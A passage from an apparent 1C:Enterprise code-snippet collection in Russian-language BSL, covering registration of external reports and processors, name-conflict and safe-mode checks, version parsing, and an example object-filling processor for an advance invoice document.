			КонфликтующийОбъект = ЭлементСписка.Значение.ПолучитьОбъект();
			ОтключитьКонфликтующую(КонфликтующийОбъект);
			КонфликтующийОбъект.Записать();
		КонецЦикла;
	ИначеЕсли ПараметрыРегистрации.ОтключатьПубликацию Тогда
		ОтключитьКонфликтующую(Объект);
	КонецЕсли;
	
	Результат = Новый Структура(""ИмяОбъекта, СтароеИмяОбъекта, Успех, ИмяОбъектаЗанято, Конфликтующие, ТекстОшибки, КраткоеПредставлениеОшибки"");
	Результат.ИмяОбъектаЗанято = Ложь;
	Результат.Успех = Ложь;
	Если Объект.ЭтоНовый() Тогда
		Результат.СтароеИмяОбъекта = Объект.ИмяОбъекта;
	Иначе
		Результат.СтароеИмяОбъекта = ОбщегоНазначения.ЗначениеРеквизитаОбъекта(Объект.Ссылка, ""ИмяОбъекта"");
	КонецЕсли;
	
	РегистрационныеДанные = ПолучитьРегистрационныеДанные(Объект, ПараметрыРегистрации, Результат);
	Если РегистрационныеДанные = Неопределено
		Или РегистрационныеДанные.Количество() = 0
		Или ЗначениеЗаполнено(Результат.ТекстОшибки)
		Или ЗначениеЗаполнено(Результат.КраткоеПредставлениеОшибки) Тогда
		Возврат Результат;
	КонецЕсли;
	
	Если РегистрационныеДанные.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ПечатнаяФорма
		И Не ОбщегоНазначения.ПодсистемаСуществует(""СтандартныеПодсистемы.Печать"") Тогда
		Результат.ТекстОшибки = НСтр(""ru = 'Работа с печатными формами не поддерживается.'"");
		Возврат Результат;
	КонецЕсли;
	
	// Если отчет публикуется, то необходим контроль уникальности имени объекта, 
	//     под которым дополнительный отчет регистрируется в системе.
	Если Объект.Публикация = Перечисления.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется Тогда
		// Проверка имени
		ТекстЗапроса =
		""ВЫБРАТЬ
		|	ТаблицаСправочника.Ссылка,
		|	ТаблицаСправочника.Представление
		|ИЗ
		|	Справочник.ДополнительныеОтчетыИОбработки КАК ТаблицаСправочника
		|ГДЕ
		|	ТаблицаСправочника.ИмяОбъекта = &ИмяОбъекта
		|	И &УсловиеДопОтчет
		|	И ТаблицаСправочника.Публикация = ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется)
		|	И ТаблицаСправочника.ПометкаУдаления = ЛОЖЬ
		|	И ТаблицаСправочника.Ссылка <> &Ссылка"";
		
		ВидыДопОтчетов = Новый Массив;
		ВидыДопОтчетов.Добавить(ВидДополнительныйОтчет);
		ВидыДопОтчетов.Добавить(ВидОтчет);
		
		Запрос = Новый Запрос;
		Запрос.УстановитьПараметр(""ИмяОбъекта"",     Результат.ИмяОбъекта);
		Запрос.УстановитьПараметр(""ВидыДопОтчетов"", ВидыДопОтчетов);
		Запрос.УстановитьПараметр(""Ссылка"", Объект.Ссылка);
		
		Если ПараметрыРегистрации.ЭтоОтчет Тогда
			ТекстЗапроса = СтрЗаменить(ТекстЗапроса, ""&УсловиеДопОтчет"", ""ТаблицаСправочника.Вид В (&ВидыДопОтчетов)"");
		Иначе
			ТекстЗапроса = СтрЗаменить(ТекстЗапроса, ""&УсловиеДопОтчет"", ""НЕ ТаблицаСправочника.Вид В (&ВидыДопОтчетов)"");
		КонецЕсли;
		
		Запрос.Текст = ТекстЗапроса;
		
		УстановитьПривилегированныйРежим(Истина);
		Конфликтующие = Запрос.Выполнить().Выгрузить();
		УстановитьПривилегированныйРежим(Ложь);
		
		Если Конфликтующие.Количество() > 0 Тогда
			Результат.ИмяОбъектаЗанято = Истина;
			Результат.Конфликтующие = Новый СписокЗначений;
			Для Каждого СтрокаТаблицы Из Конфликтующие Цикл
				Результат.Конфликтующие.Добавить(СтрокаТаблицы.Ссылка, СтрокаТаблицы.Представление);
			КонецЦикла;
			Возврат Результат;
		КонецЕсли;
	КонецЕсли;
	
	Если РегистрационныеДанные.БезопасныйРежим
		ИЛИ Пользователи.ЭтоПолноправныйПользователь(, Истина) Тогда
		// ничего не делаем
	Иначе
		Результат.ТекстОшибки = НСтр(""ru = 'Для подключения обработки, запускаемой в небезопасном режиме, требуются административные права.'"");
		Возврат Результат;
	КонецЕсли;
	
	Если НЕ Объект.ЭтоНовый() И РегистрационныеДанные.Вид <> Объект.Вид Тогда
		Результат.ТекстОшибки = 
			СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Вид загружаемого объекта (%1) не соответствует текущему (%2).
					|Для загрузки нового объекта нажмите """"Создать"""".'""),
				Строка(РегистрационныеДанные.Вид),
				Строка(Объект.Вид));
		Возврат Результат;
	ИначеЕсли ПараметрыРегистрации.ЭтоОтчет <> (РегистрационныеДанные.Вид = ВидДополнительныйОтчет ИЛИ РегистрационныеДанные.Вид = ВидОтчет) Тогда
		Результат.ТекстОшибки = НСтр(""ru = 'Вид обработки, указанный в сведениях о внешней обработке, не соответствует ее расширению.'"");
		Возврат Результат;
	КонецЕсли;
	
	Объект.Наименование    = РегистрационныеДанные.Наименование;
	Объект.Версия          = РегистрационныеДанные.Версия;
	
	Если РегистрационныеДанные.Свойство(""ВерсияБСП"") Тогда
		Если ОбщегоНазначенияКлиентСервер.СравнитьВерсии(РегистрационныеДанные.ВерсияБСП, ""2.2.2.0"") > 0 Тогда
			Объект.РежимСовместимостиРазрешений = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_2_2;
		Иначе
			Объект.РежимСовместимостиРазрешений = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_1_3;
		КонецЕсли;
	Иначе
		Объект.РежимСовместимостиРазрешений = Перечисления.РежимыСовместимостиРазрешенийДополнительныхОтчетовИОбработок.Версия_2_1_3;
	КонецЕсли;
	
	Если РегистрационныеДанные.Свойство(""БезопасныйРежим"") Тогда
		Объект.БезопасныйРежим = РегистрационныеДанные.БезопасныйРежим;
	КонецЕсли;
	
	Объект.Информация      = РегистрационныеДанные.Информация;
	Объект.ИмяФайла        = ПараметрыРегистрации.ИмяФайла;
	Объект.ИмяОбъекта      = Результат.ИмяОбъекта;
	
	Объект.ИспользуетХранилищеВариантов = Ложь;
	Если (РегистрационныеДанные.Вид = ВидДополнительныйОтчет) ИЛИ (РегистрационныеДанные.Вид = ВидОтчет) Тогда
		Если РегистрационныеДанные.ХранилищеВариантов = ""ХранилищеВариантовОтчетов""
			ИЛИ (Метаданные.ХранилищеВариантовОтчетов <> Неопределено
				И Метаданные.ХранилищеВариантовОтчетов.Имя = ""ХранилищеВариантовОтчетов"") Тогда
			Объект.ИспользуетХранилищеВариантов = Истина;
		КонецЕсли;
		РегистрационныеДанные.Свойство(""ОпределитьНастройкиФормы"", Объект.ТеснаяИнтеграцияСФормойОтчета);
	КонецЕсли;
	
	// Загружена другая обработка (изменилось имя объекта или вид обработки).
	Если Объект.ЭтоНовый() ИЛИ Объект.ИмяОбъекта <> Результат.ИмяОбъекта ИЛИ Объект.Вид <> РегистрационныеДанные.Вид Тогда
		Объект.Назначение.Очистить();
		Объект.Разделы.Очистить();
		Объект.Вид = РегистрационныеДанные.Вид;
	КонецЕсли;
	
	// Если не заполнено назначение - устанавливаем назначение из обработки.
	Если Объект.Назначение.Количество() = 0
		И Объект.Вид <> ВидДополнительныйОтчет
		И Объект.Вид <> ВидДополнительнаяОбработка Тогда
		
		Если РегистрационныеДанные.Свойство(""Назначение"") Тогда
			ТаблицаОбъектовМетаданных = ПодключенныеОбъектыМетаданных(Объект.Вид);
			
			Для Каждого ПолноеИмяОбъектаМетаданных Из РегистрационныеДанные.Назначение Цикл
				ПозицияТочки = СтрНайти(ПолноеИмяОбъектаМетаданных, ""."");
				Если Сред(ПолноеИмяОбъектаМетаданных, ПозицияТочки + 1) = ""*"" Тогда // Например [Справочник.*].
					Поиск = Новый Структура(""Вид"", Лев(ПолноеИмяОбъектаМетаданных, ПозицияТочки - 1));
				Иначе
					Поиск = Новый Структура(""ПолноеИмя"", ПолноеИмяОбъектаМетаданных);
				КонецЕсли;
				
				Найденные = ТаблицаОбъектовМетаданных.НайтиСтроки(Поиск);
				Для Каждого СтрокаТаблицы Из Найденные Цикл
					СтрокаНазначение = Объект.Назначение.Добавить();
					СтрокаНазначение.ОбъектНазначения = СтрокаТаблицы.Ссылка;
				КонецЦикла;
			КонецЦикла;
		КонецЕсли;
		
		Объект.Назначение.Свернуть(""ОбъектНазначения"", """");
		
	КонецЕсли;
	
	Объект.Команды.Очистить();
	
	// Инициализация команд
	
	Для Каждого КомандаОписание Из РегистрационныеДанные.Команды Цикл
		
		Если НЕ ЗначениеЗаполнено(КомандаОписание.ВариантЗапуска) Тогда
			ОбщегоНазначенияКлиентСервер.СообщитьПользователю(
				СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(НСтр(""ru = 'Для команды """"%1"""" не определен способ запуска.'""), КомандаОписание.Представление));
		КонецЕсли;
		
		Команда = Объект.Команды.Добавить();
		ЗаполнитьЗначенияСвойств(Команда, КомандаОписание);
		
	КонецЦикла;
	
	// Чтение разрешений, запрашиваемых дополнительной обработкой.
	Объект.Разрешения.Очистить();
	Разрешения = Неопределено;
	Если РегистрационныеДанные.Свойство(""Разрешения"", Разрешения) Тогда
		
		Для Каждого Разрешение Из Разрешения Цикл
			
			ТипXDTO = Разрешение.Тип();
			
			СтрокаТЧ = Объект.Разрешения.Добавить();
			СтрокаТЧ.ВидРазрешения = ТипXDTO.Имя;
			
			Параметры = Новый Структура();
			
			Для Каждого СвойствоXDTO Из ТипXDTO.Свойства Цикл
				
				Контейнер = Разрешение.ПолучитьXDTO(СвойствоXDTO.Имя);
				
				Если Контейнер <> Неопределено Тогда
					Параметры.Вставить(СвойствоXDTO.Имя, Контейнер.Значение);
				Иначе
					Параметры.Вставить(СвойствоXDTO.Имя);
				КонецЕсли;
				
			КонецЦикла;
			
			СтрокаТЧ.Параметры = Новый ХранилищеЗначения(Параметры);
			
		КонецЦикла;
		
	КонецЕсли;
	
	Объект.Ответственный = Пользователи.ТекущийПользователь();
	
	Результат.Успех = Истина;
	
	Возврат Результат;
	
КонецФункции

// Для внутреннего использования.
Функция ПолучитьРегистрационныеДанные(Знач Объект, Знач ПараметрыРегистрации, Знач РезультатРегистрации)

	РегистрационныеДанные = Новый Структура;
	СтандартнаяОбработка = Истина;
	
	ИнтеграцияСТехнологиейСервиса.ПриПолученииРегистрационныхДанных(Объект, РегистрационныеДанные, СтандартнаяОбработка);
	Если СтандартнаяОбработка Тогда
		ПриПолученииРегистрационныхДанных(Объект, РегистрационныеДанные, ПараметрыРегистрации, РезультатРегистрации);
	КонецЕсли;
	
	Возврат РегистрационныеДанные;
КонецФункции

// Для внутреннего использования.
Процедура ПриПолученииРегистрационныхДанных(Объект, РегистрационныеДанные, ПараметрыРегистрации, РезультатРегистрации)
	
	// Подключение и получение имени, под которым объект будет подключаться.
	Менеджер = ?(ПараметрыРегистрации.ЭтоОтчет, ВнешниеОтчеты, ВнешниеОбработки);
	
	ИнформацияОбОшибке = Неопределено;
	Попытка
		#Если ТолстыйКлиентОбычноеПриложение Тогда
			РезультатРегистрации.ИмяОбъекта = ПолучитьИмяВременногоФайла();
			ДвоичныеДанные = ПолучитьИзВременногоХранилища(ПараметрыРегистрации.АдресДанныхОбработки);
			ДвоичныеДанные.Записать(РезультатРегистрации.ИмяОбъекта);
		#Иначе
			Если ОбщегоНазначения.ЕстьЗащитаОтОпасныхДействий() Тогда
				РезультатРегистрации.ИмяОбъекта =
					СокрЛП(Менеджер.Подключить(ПараметрыРегистрации.АдресДанныхОбработки, , Истина,
						ОбщегоНазначения.ОписаниеЗащитыБезПредупреждений()));
			Иначе
				РезультатРегистрации.ИмяОбъекта =
					СокрЛП(Менеджер.Подключить(ПараметрыРегистрации.АдресДанныхОбработки, , Истина));
			КонецЕсли;
		#КонецЕсли
		
		// Получение сведений о внешней обработке.
		ВнешнийОбъект = Менеджер.Создать(РезультатРегистрации.ИмяОбъекта);
		ВнешнийОбъектМетаданные = ВнешнийОбъект.Метаданные();
		
		СведенияОВнешнейОбработке = ВнешнийОбъект.СведенияОВнешнейОбработке();
		ОбщегоНазначенияКлиентСервер.ДополнитьСтруктуру(РегистрационныеДанные, СведенияОВнешнейОбработке, Истина);
	Исключение
		ИнформацияОбОшибке = ИнформацияОбОшибке();
	КонецПопытки;
	#Если ТолстыйКлиентОбычноеПриложение Тогда
		Попытка
			УдалитьФайлы(РезультатРегистрации.ИмяОбъекта);
		Исключение
			ТекстПредупреждения = СтроковыеФункцииКлиентСервер.ПодставитьПараметрыВСтроку(
				НСтр(""ru = 'Ошибка при получении регистрационных данных:
				|Ошибка при удалении временного файла """"%1"""":
				|%2'""),
				РезультатРегистрации.ИмяОбъекта,
				ПодробноеПредставлениеОшибки(ИнформацияОбОшибке()));
			ЗаписатьПредупреждение(Объект.Ссылка, ТекстПредупреждения);
		КонецПопытки;
	#КонецЕсли
	Если ИнформацияОбОшибке <> Неопределено Тогда
		Если ПараметрыРегистрации.ЭтоОтчет Тогда
			ТекстОшибки = НСтр(""ru='Невозможно подключить дополнительный отчет из файла.
			|Возможно, он не подходит для этой версии программы.'"");
		Иначе
			ТекстОшибки = НСтр(""ru='Невозможно подключить дополнительную обработку из файла.
			|Возможно, она не подходит для этой версии программы.'"");
		КонецЕсли;
		РезультатРегистрации.ТекстОшибки = ТекстОшибки;
		РезультатРегистрации.КраткоеПредставлениеОшибки = КраткоеПредставлениеОшибки(ИнформацияОбОшибке);
		ТекстОшибки = ТекстОшибки + Символы.ПС + Символы.ПС + НСтр(""ru = 'Техническая информация:'"") + Символы.ПС;
		ЗаписатьОшибку(Объект.Ссылка, ТекстОшибки + ПодробноеПредставлениеОшибки(ИнформацияОбОшибке));
		Возврат;
	КонецЕсли;
	
	Если РегистрационныеДанные.Наименование = Неопределено ИЛИ РегистрационныеДанные.Информация = Неопределено Тогда
		Если РегистрационныеДанные.Наименование = Неопределено Тогда
			РегистрационныеДанные.Наименование = ВнешнийОбъектМетаданные.Представление();
		КонецЕсли;
		Если РегистрационныеДанные.Информация = Неопределено Тогда
			РегистрационныеДанные.Информация = ВнешнийОбъектМетаданные.Комментарий;
		КонецЕсли;
	КонецЕсли;
	
	Если ТипЗнч(РегистрационныеДанные.Вид) <> Тип(""ПеречислениеСсылка.ВидыДополнительныхОтчетовИОбработок"") Тогда
		РегистрационныеДанные.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок[РегистрационныеДанные.Вид];
	КонецЕсли;
	
	РегистрационныеДанные.Вставить(""ХранилищеВариантов"");
	Если РегистрационныеДанные.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.ДополнительныйОтчет
		Или РегистрационныеДанные.Вид = Перечисления.ВидыДополнительныхОтчетовИОбработок.Отчет Тогда
		Если ВнешнийОбъектМетаданные.ХранилищеВариантов <> Неопределено Тогда
			РегистрационныеДанные.ХранилищеВариантов = ВнешнийОбъектМетаданные.ХранилищеВариантов.Имя;
		КонецЕсли;
	КонецЕсли;
	
	РегистрационныеДанные.Команды.Колонки.Добавить(""ВариантЗапуска"");
	
	Для Каждого КомандаОписание Из РегистрационныеДанные.Команды Цикл
		КомандаОписание.ВариантЗапуска = Перечисления.СпособыВызоваДополнительныхОбработок[КомандаОписание.Использование];
	КонецЦикла;
	
	#Если ТолстыйКлиентОбычноеПриложение Тогда
		РезультатРегистрации.ИмяОбъекта = ВнешнийОбъектМетаданные.Имя;
	#КонецЕсли
КонецПроцедуры

// Вывод команд заполнения в формах объектов.
Процедура ПриОпределенииКомандЗаполненияПодключенныхКОбъекту(Команды, ИОМы, БыстрыйПоискПоИОМам)
	Запрос = Новый Запрос;
	Запрос.Текст =
	""ВЫБРАТЬ
	|	Таблица.Ссылка,
	|	Таблица.Команды.(
	|		Идентификатор,
	|		ВариантЗапуска,
	|		Представление,
	|		ПоказыватьОповещение,
	|		Скрыть
	|	),
	|	Таблица.Назначение.(
	|		ОбъектНазначения
	|	)
	|ИЗ
	|	Справочник.ДополнительныеОтчетыИОбработки КАК Таблица
	|ГДЕ
	|	Таблица.Назначение.ОбъектНазначения В(&ИОМы)
	|	И Таблица.Вид = &Вид
	|	И Таблица.ИспользоватьДляФормыОбъекта = ИСТИНА
	|	И Таблица.Публикация = ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется)
	|	И Таблица.Публикация <> ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Отключена)
	|	И Таблица.ПометкаУдаления = ЛОЖЬ"";
	Запрос.УстановитьПараметр(""ИОМы"", ИОМы);
	Запрос.УстановитьПараметр(""Вид"", Перечисления.ВидыДополнительныхОтчетовИОбработок.ЗаполнениеОбъекта);
	Если ПравоДоступа(""Изменение"", Метаданные.Справочники.ДополнительныеОтчетыИОбработки) Тогда
		Запрос.Текст = СтрЗаменить(Запрос.Текст, ""И Таблица.Публикация = ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Используется)"", """");
	Иначе
		Запрос.Текст = СтрЗаменить(Запрос.Текст, ""И Таблица.Публикация <> ЗНАЧЕНИЕ(Перечисление.ВариантыПубликацииДополнительныхОтчетовИОбработок.Отключена)"", """");
	КонецЕсли;
	
	КлючиПараметровОбработчика = ""Ссылка, Идентификатор, ВариантЗапуска, Представление, ПоказыватьОповещение, ЭтоОтчет"";
	ЗаполнениеФормы = Перечисления.СпособыВызоваДополнительныхОбработок.ЗаполнениеФормы;
	
	ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса = ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса();
	Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса Тогда
		МодульДополнительныеОтчетыИОбработкиВМоделиСервиса = ОбщегоНазначения.ОбщийМодуль(""ДополнительныеОтчетыИОбработкиВМоделиСервиса"");
	КонецЕсли;
	
	Таблица = Запрос.Выполнить().Выгрузить();
	Для Каждого ОтчетИлиОбработка Из Таблица Цикл
		Если ИспользуетсяТеснаяИнтеграцияСПодсистемойВМоделиСервиса
			И Не МодульДополнительныеОтчетыИОбработкиВМоделиСервиса.ЭтоПоставляемаяОбработка(ОтчетИлиОбработка.Ссылка) Тогда
			Продолжить;
		КонецЕсли;
		
		ТипыЗаполнениеОбъекта = Новый Массив;
		Для Каждого СтрокаТаблицыНазначение Из ОтчетИлиОбработка.Назначение Цикл
			Источник = БыстрыйПоискПоИОМам[СтрокаТаблицыНазначение.ОбъектНазначения];
			Если Источник = Неопределено Тогда
				Продолжить;
			КонецЕсли;
			ПодключаемыеКоманды.ДополнитьМассивТипов(ТипыЗаполнениеОбъекта, Источник.ТипСсылкиДанных);
		КонецЦикла;
		
		Для Каждого СтрокаТаблицы Из ОтчетИлиОбработка.Команды Цикл
			Если СтрокаТаблицы.Скрыть Тогда
				Продолжить;
			КонецЕсли;
			Команда = Команды.Добавить();
			Команда.Вид            = ""ЗаполнениеОбъектов"";
			Команда.Представление  = СтрокаТаблицы.Представление;
			Команда.Важность       = ""СмТакже"";
			Команда.Порядок        = 50;
			Команда.ИзменяетВыбранныеОбъекты = Истина;
			Если СтрокаТаблицы.ВариантЗапуска = ЗаполнениеФормы Тогда
				Команда.Обработчик  = ""ДополнительныеОтчетыИОбработки.ОбработчикКомандыЗаполнения"";
				Команда.РежимЗаписи = ""НеЗаписывать"";
			Иначе
				Команда.Обработчик  = ""ДополнительныеОтчетыИОбработкиКлиент.ОбработчикКомандыЗаполнения"";
				Команда.РежимЗаписи = ""Записывать"";
			КонецЕсли;
			Команда.ТипПараметра = Новый ОписаниеТипов(ТипыЗаполнениеОбъекта);
			Команда.ДополнительныеПараметры = Новый Структура(КлючиПараметровОбработчика);
			ЗаполнитьЗначенияСвойств(Команда.ДополнительныеПараметры, СтрокаТаблицы);
			Команда.ДополнительныеПараметры.Ссылка = ОтчетИлиОбработка.Ссылка;
			Команда.ДополнительныеПараметры.ЭтоОтчет = Ложь;
		КонецЦикла;
	КонецЦикла;
КонецПроцедуры

// Преобразует строковое представление версии в числовое.
//
Функция ВерсияЧислом(ВерсияСтрокой)
	Если ПустаяСтрока(ВерсияСтрокой) Или ВерсияСтрокой = ""0.0.0.0"" Тогда
		Возврат 0;
	КонецЕсли;
	
	Разряд = 0;
	
	Результат = 0;
	
	ОписаниеТипаЧисло = Новый ОписаниеТипов(""Число"");
	Остаток = ВерсияСтрокой;
	ПозицияТочки = СтрНайти(Остаток, ""."");
	Пока ПозицияТочки > 0 Цикл
		ЧислоСтрокой = Лев(Остаток, ПозицияТочки - 1);
		Число = ОписаниеТипаЧисло.ПривестиЗначение(ЧислоСтрокой);
		Результат = Результат * 1000 + Число;
		Остаток = Сред(Остаток, ПозицияТочки + 1);
		ПозицияТочки = СтрНайти(Остаток, ""."");
		Разряд = Разряд + 1;
	КонецЦикла;
	
	Число = ОписаниеТипаЧисло.ПривестиЗначение(Остаток);
	Результат = Результат * 1000 + Число;
	Разряд = Разряд + 1;
	
	// Номера версии после 4 точки возвращает после запятой.
	// Например, для версии ""1.2.3.4.5.6.7"" вернет 1002003004,005006007.
	Если Разряд > 4 Тогда
		Результат = Результат / Pow(1000, Разряд - 4);
	КонецЕсли;
	
	Возврат Результат;
КонецФункции

#КонецОбласти
"}
},
{0,
{"ДополнительныеОтчетыИОбработки Модуль Пример",0,0,"","ПараметрыРегистрации 		= ДополнительныеОтчетыИОбработки.СведенияОВнешнейОбработке(""2.2.2.1"");
ПараметрыРегистрации.Вид 	= ДополнительныеОтчетыИОбработкиКлиентСервер.ВидОбработкиДополнительныйОтчет();
ПараметрыРегистрации.Версия = ""1.0"";

Команда 				= ПараметрыРегистрации.Команды.Добавить();
Команда.Представление 	= НСтр(""ru = 'Бюджет движения денежных средств (Нордстар)'"");
Команда.Идентификатор 	= ""норд_Отчет_БДДС"";
Команда.Использование 	= ДополнительныеОтчетыИОбработкиКлиентСервер.ТипКомандыОткрытиеФормы();
Команда.ПоказыватьОповещение = Истина;

Возврат ПараметрыРегистрации;"}
},
{0,
{"СписокМакетов",0,0,"","МассивМакетов = Новый Массив;

рфОбъектЗначение = РеквизитФормыВЗначение(""Объект"");

// Выполнение операций с Объектом ""рфОбъектЗначение""
Макеты = рфОбъектЗначение.Метаданные().Макеты;

Для каждого Макет Из Макеты Цикл
	
	МассивМакетов.Добавить(Макет.Имя);
	
КонецЦикла;

Элементы.ИмяМакета.СписокВыбора.ЗагрузитьЗначения(МассивМакетов);

Если Элементы.ИмяМакета.СписокВыбора.Количество() > 0 Тогда
	ИмяМакета = Элементы.ИмяМакета.СписокВыбора[0];
КонецЕсли;"}
},
{0,
{"Печатные формы для замены",0,0,"КПФ","Для каждого СтрокаПФ Из КоллекцияПечатныхФорм Цикл
	
	Если СтрокаПФ.ИмяМакета = ""СчетНаОплатуФаксимиле"" Тогда
		СтрокаПФ.ИмяМакета 	= ""СчетНаОплату"";
		СтрокаПФ.ИмяВРЕГ 	= Врег(СтрокаПФ.ИмяМакета);
	КонецЕсли;
	
КонецЦикла;"}
},
{0,
{"Получить версию БСП",0,0,"","ВерсияБСП = СтандартныеПодсистемыСервер.ВерсияБиблиотеки();
Сообщить(ВерсияБСП);

&НаСервереБезКонтекста
Функция ПолучитьВерсиюБСПНаСервере()
	
	ВерсияБСП = СтандартныеПодсистемыСервер.ВерсияБиблиотеки();
	Возврат ВерсияБСП;
	
КонецФункции // ПолучитьВерсиюБСПНаСервере()"}
},
{2,
{"ЗаполнениеОбъекта (заполнить ТЧ)",1,0,"",""},
{0,
{"ЗаполнениеОбъекта",0,0,"","Функция СведенияОВнешнейОбработке() Экспорт
	
	ПараметрыРегистрации = Новый Структура;
	МассивНазначений = Новый Массив;
	МассивНазначений.Добавить(""Документ.СчетФактураВыданныйАванс"");
	
	ПараметрыРегистрации.Вставить(""Вид"", ""ЗаполнениеОбъекта"");
	ПараметрыРегистрации.Вставить(""Назначение"", МассивНазначений);
	ПараметрыРегистрации.Вставить(""Наименование"", ""Заполнить документ"");
	ПараметрыРегистрации.Вставить(""Версия"", ""1.0"");
	ПараметрыРегистрации.Вставить(""БезопасныйРежим"", Истина);
	ПараметрыРегистрации.Вставить(""Информация"", ""Дополнительная обработка табличной части к документу счет-фактура выданный аванс"");
	
	ТаблицаКоманд = ПолучитьТаблицуКоманд();
	
	ДобавитьКоманду(ТаблицаКоманд,
	""Заполнить документ"",
	""Заполнить документ"",
	""ВызовКлиентскогоМетода"",
	Истина);
	
	ПараметрыРегистрации.Вставить(""Команды"", ТаблицаКоманд);
	
	Возврат ПараметрыРегистрации;
	
КонецФункции

Функция ПолучитьТаблицуКоманд()
	
	Команды = Новый ТаблицаЗначений;
	Команды.Колонки.Добавить(""Представление"", Новый ОписаниеТипов(""Строка""));
	Команды.Колонки.Добавить(""Идентификатор"", Новый ОписаниеТипов(""Строка""));
	Команды.Колонки.Добавить(""Использование"", Новый ОписаниеТипов(""Строка""));
	Команды.Колонки.Добавить(""ПоказыватьОповещение"", Новый ОписаниеТипов(""Булево""));
	Команды.Колонки.Добавить(""Модификатор"", Новый ОписаниеТипов(""Строка""));
	
	Возврат Команды;
	
КонецФункции

Процедура ДобавитьКоманду(ТаблицаКоманд, Представление, Идентификатор, Использование, ПоказыватьОповещение = Ложь, Модификатор = """")
	
	НоваяКоманда = ТаблицаКоманд.Добавить();
	НоваяКоманда.Представление = Представление;
	НоваяКоманда.Идентификатор = Идентификатор;
	НоваяКоманда.Использование = Использование;
	НоваяКоманда.ПоказыватьОповещение = ПоказыватьОповещение;
	НоваяКоманда.Модификатор = Модификатор;
	
КонецПроцедуры

//Так как мы использовали ВызовКлиентскогоМетода, то обязательную процедуру, 
//для внешней подключаемой обработки заполнения объектов, 
//ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначенияМассив) Экспорт, 
//необходимо выполнять &НаКлиенте в модуле формы обработки, а значит создадим 
//любую форму обработки, пользователь её всеравно не увидит, и поместим внутрь модуля формы следующий код:

&НаКлиенте
Процедура ВыполнитьКоманду(ИдентификаторКоманды, ОбъектыНазначенияМассив) Экспорт
	//Спросим у пользователя разрешение на продолжение обработки
	Режим = РежимДиалогаВопрос.ДаНет;
	Текст = ""Текущие данные документа будут заменены новыми без возможности восстановления.
	|Продолжить?"";
	Ответ = Вопрос(Текст, Режим, 0);
	
	Если Ответ = КодВозвратаДиалога.Да Тогда
		
		//Если пользователь дал разрешение на продолжение, то начнем перебирать все
		//документы, у которых мы планируем заполнить табличную часть
		Для каждого Элемент из ОбъектыНазначенияМассив Цикл
			
			//Зададим ключ поиска документа, из которого вызвана данная обработка,
			//чтобы получить ссылку на редактирумый документ в удобном виде для
			//функции ОткрытьФорму()
			КлючПоиска = Новый Структура(""Ключ"", Элемент);
			
			//Но нам не надо открывать новую форму (окно) для изменяемого документа, а
			//Нам надо все изменения показать в уже открытых у клиента окнах
			Окна = ПолучитьОкна();
			Для каждого Окно из Окна Цикл
				
				//Окно изменяемого документа будет точно не основным, а вспомогательным, поэтому
				//сразу пропускаем основное окно, а далее идем на не очень хороший способ поиска открытого окна
				//изменяемого документа. Мы просто переберем все окна, а в заголовке, которых будет встречаться
				//Наименование, номер и дата нужного документа - будем изменять
				Если НЕ Окно.Основное И Найти(Окно.Заголовок, Элемент) Тогда
					//Передадим ключ поиска (можно сказать ссылку на объект) и данные о найденном открытом окне
					//в функцию ОткрытьФорму()
					//Код находится в цикле на тот случай, если открытых окон изменяемого документа больше одного
					Форма = ОткрытьФорму(""Документ.СчетФактураВыданныйАванс.Форма.ФормаДокумента"",КлючПоиска,,,Окно);
					
					//Далее мы получаем объект только, что повторно открытой формы и помещаем её в переменную
					//В объекте содержатся все реквизиты (элементы) формы
					НовыйОбъект = Форма.Объект;
					
					//Мы помещаем объект формы в переменную,
					//так как должны передать её в процедуру на сервере,
					//где нельзя изменять объект формы, зато можно править переменную содержащую его
					ЗаполнитьОбъект(НовыйОбъект);
					
					//После выполнения процедуры на сервере мы получаем изменную переменную НовыйОбъект,
					//которую необходимо передать в уже полученную нами форму
					КопироватьДанныеФормы(НовыйОбъект, Форма.Объект);
				КонецЕсли;
				
			КонецЦикла;
			
		КонецЦикла;
		
	КонецЕсли;
	
КонецПроцедуры

&НаСервере
Функция ЗаполнитьОбъект(НовыйОбъект)
	
	Если ТипЗнч(НовыйОбъект.ДокументОснование) = Тип(""ДокументСсылка.ПоступлениеБезналичныхДенежныхСредств"") Тогда
		
		Если НовыйОбъект.ДокументОснование.РасшифровкаПлатежа.Количество() > 0 Тогда
			НовыйОбъект.Авансы.Очистить();
		КонецЕсли;
		
		Для каждого СтрокаТЧ из НовыйОбъект.ДокументОснование.РасшифровкаПлатежа Цикл
			
			НоваяСтрока = НовыйОбъект.Авансы.Добавить();
			Если ЗначениеЗаполнено(СтрокаТЧ.СчетНаОплату) Тогда
				НоваяСтрока.Содержание = ""Предварительная оплата"" + ФормированиеПечатныхФорм.СформироватьЗаголовокДокумента(СтрокаТЧ.СчетНаОплату, НСтр(""ru=' по счету на оплату'""));
			КонецЕсли;
			НоваяСтрока.Сумма 		= СтрокаТЧ.Сумма;
			НоваяСтрока.СтавкаНДС 	= Перечисления.СтавкиНДС.НДС18_118;
			ТекПроцентНДС 			= ЦенообразованиеКлиентСервер.ПолучитьСтавкуНДСЧислом(НоваяСтрока.СтавкаНДС);
			НоваяСтрока.СуммаНДС 	= ЦенообразованиеКлиентСервер.РассчитатьСуммуНДС(НоваяСтрока.Сумма, ТекПроцентНДС);
			
		КонецЦикла;
	КонецЕсли;
	
КонецФункции"}
},
{0,
